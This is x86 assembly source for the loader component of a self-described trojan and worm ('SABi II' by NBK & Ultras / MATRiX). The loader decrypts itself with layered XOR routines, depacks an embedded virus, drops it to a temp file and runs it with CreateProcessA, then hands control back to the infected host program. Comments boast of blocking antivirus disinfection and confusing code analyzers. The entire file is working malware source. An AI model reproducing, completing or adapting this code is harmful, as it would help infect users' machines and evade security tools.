   ; Trojan/I-Worm/Palm/Wm/W32.SABi¡ II
   ; 
   ; by: NBK & Ultras / MATRiX

   ;***************************************************************
   ;*                                                             *
   ;*         LOADER v1.0       Copyright (c) by NBK              *
   ;*                                                             *
   ;*                +/- 900 bytes lenght                         *
   ;***************************************************************

   align 4  ;  we've to align this code to subtract from ESP

   loader@ini:

   cld
   call delta

   ;  we need to decrypt all loader's code
   ;  PUSHed into stack by KME32-3

comment #

   lea eax, [ebp+(offset api@002 - offset delta)]
   mov ecx, 

   l1_decrypt_stack:

   sub [eax], 09786534h
   xor [eax], 10923874h
   add [eax], 12435687h
   add eax, 4
   loop l1_decrypt_stack

#

   push NULL
   push '23LE'
   push 'NREK'
   push esp
   dw 15ffh
   w_handle@018 dd 0 ;  LoadLibrary()/GetModuleHandle()
   add esp, (4*3)
   mov ebx, eax
   call api@002b

   db 'CreateFileA',0
   db 'WriteFile',0
   db 'CloseHandle',0
   db 'VirtualProtect',0
   db 'OpenMutexA',0   ;   no win32
   db 'GetTempPathA',0
   db 'GetTempFileNameA',0
   db 'CreateProcessA',0
   db 'GetStartupInfoA',0
   db 'GlobalAlloc',0
   db 'GlobalFree',0

   api@002b:

   pop esi
   lea edi, [ebp+(offset api@001 - offset delta)]
   mov ecx, (offset api@002 - offset api@001)/4

   api@003:

   push ecx
   push esi
   push ebx
   dw 15ffh
   w_handle@017 dd 0 ;  GetProcAddress()
   pop ecx
   stosd

   api@004:

   lodsb
   test al, al
   jnz api@004
   loop api@003
   lea eax, [ebp+(offset w_ionumb@014 - offset delta)]
   push eax
   push 40h ;  PAGE_EXECUTE_READWRITE
   push dword ptr [ebp+(offset w_ionumb@008 - offset delta)]   ;   size
   call loader_f_entry
   push eax
   call [ebp+(offset _VirtualProtect - offset delta)]

   loader@alloc:

   push dword ptr [ebp+(offset loadmem@002 - offset delta)]
   push 40h ;  GMEM_ZEROINIT
   call [ebp+(offset _GlobalAlloc - offset delta)]
   mov [ebp+(offset loadmem@003 - offset delta)], eax
   mov edi, eax
   push eax
   lea esi, [ebp+(offset loadmem@001 - offset delta)]
   mov ecx, (offset loader@end - offset loadmem@001)
   rep movsb
   call loader_f_entry
   lea esi, [eax+7]
   mov ecx, 12345678h
   loadmem@002 equ dword ptr $-4   ;   VIRUS LOADER + PACKED VIRUS + REAL PACKED FILE DATA
   sub ecx, (offset loader@end - offset loadmem@001)
   rep movsb
   ret

   loadmem@001:

   ; adjust poly

   add esp, loader_size ;  kme
   call delta
   call label@001

   mutex@001 label

   dd 'iBAS'/2 + 'AAAA'
   dd 'II-¡'/2 + 'AAAA'
   db 0

   include _depack2.INC   ;   169 bytes

   delta:
   db 0e8h
   dd 0
   pop ebp
   sub ebp, 5
   ret

   label@001:

   mov eax, [ebp+(offset w_handle@014 - offset delta)]
   add eax, 12345678h
   w_ionumb@010 equ dword ptr $-4   ;   size of packed data
   lea edi, [ebp+(offset loader@end - offset delta)]
   mov esi, edi
   xor [esi], 12345678h
   xor_hide equ dword ptr $-4 ;  with this simple XOR AVers can't desinfect filez,
   sub edx, edx               ;  kme3 will protect this value
   mov ecx, 4
   div ecx
   mov ecx, eax
   push ecx
   push esi
   lodsd
   mov ebx, eax
   not eax
   stosd

   decrypt@001:   ;  let's fuck some code analyzers...

   lodsd
   push eax
   xor eax, ebx
   pop ebx
   stosd
   loop decrypt@001

   pop esi
   pop ecx

   decrypt@002:   ;  usual encryption...

   xor [esi], 12345678h
   rnd_loader1_xor equ dword ptr $-4
   sub [esi], 12345678h
   rnd_loader1_sub equ dword ptr $-4
   xor [esi], 12345678h
   rnd_loader1_xor2 equ dword ptr $-4
   add [esi], 12345678h
   rnd_loader1_add equ dword ptr $-4
   lodsd
   loop decrypt@002

   push TRUE
   push 00100000h
   call [ebp+(offset _OpenMutexA - offset delta)]
   test eax, eax
   jz mutex@ini
   push eax
   call [ebp+(offset _CloseHandle - offset delta)]
   jmp saida@001   ;   Virus in memory, back to original file...

   mutex@ini:

   sub esp, MAX_PATH
   mov ebx, esp
   push ebx
   push MAX_PATH
   call [ebp+(offset _GetTempPathA - offset delta)]
   push '_s2_'
   string_rnd_filez equ dword ptr $-4
   mov eax, esp
   push ebx
   push NULL
   push eax
   push ebx
   call [ebp+(offset _GetTempFileNameA - offset delta)]
   pop eax
   call loader_f_entry
   push eax
   mov edi, eax
   lea eax, [ebp+(offset loader@end - offset delta)+4]
   push eax
   call _aP_depack_asm2
   xor eax, eax
   push eax
   push eax
   push 2   ;   CREATE_ALWAYS
   push eax
   inc eax
   push eax
   push GENERIC_READ or GENERIC_WRITE
   push ebx
   call [ebp+(offset _CreateFileA - offset delta)]
   mov esi, eax
   xor eax, eax
   push eax
   mov ecx, esp
   push eax
   push ecx
   push 12345678h
fsize2 equ dword ptr $-4
   push edi
   push esi
   call [ebp+(offset _WriteFile - offset delta)]
   pop ecx
   push esi
   call [ebp+(offset _CloseHandle - offset delta)]

   ; Getting some basic info.

   sub esp, 80
   mov edi, esp
   push edi
   call [ebp+(offset _GetStartupInfoA - offset delta)]

   ; Little boy spawned, let's play it

   sub esp, 20
   push esp
   push edi
   xor eax, eax
   push eax
   push eax
   push 20h   ;   NORMAL_PRIORITY_CLASS
   push eax
   push eax
   push eax
   push eax
   push ebx
   call [ebp+(offset _CreateProcessA - offset delta)]
   add esp, (MAX_PATH + 80 + 20)

   saida@001:

   call loader_f_entry
   push eax
   lea eax, [(ebp+offset loader@end - offset delta)+4]
   db 5
   w_handle@014 dd 0   ;   size of virus packed code
   push eax
   call _aP_depack_asm2

   db 104
   loadmem@003 dd 0   ;   HANDLE GlobalAlloc()
   call [ebp+(offset _GlobalFree - offset delta)]

   push eax
   mov edx, esp
   call loader_f_entry
   push edx
   db 104
   w_ionumb@014 dd 0   ;   last acess type
   db 104
   w_ionumb@008 dd 0   ;   section size
   push eax            ;   Offset
   call [ebp+(offset _VirtualProtect - offset delta)]
   pop eax
   popad
   popf
   jmp eax

   loader_f_entry:

   mov eax, 12345678h
   w_ionumb@001 equ dword ptr $-4   ;   imagebase
   add eax, 12345678h
   w_ionumb@004 equ dword ptr $-4   ;   entrypoint
   ret

   api@001 label

   _CreateFileA dd 0
   _WriteFile dd 0
   _CloseHandle dd 0
   _VirtualProtect dd 0
   _OpenMutexA dd 0
   _GetTempPathA dd 0
   _GetTempFileNameA dd 0
   _CreateProcessA dd 0
   _GetStartupInfoA dd 0
   _GlobalAlloc dd 0
   _GlobalFree dd 0

   api@002 label

   align 4

   loader@end:

   loader_size equ (offset loader@end - offset loader@ini)
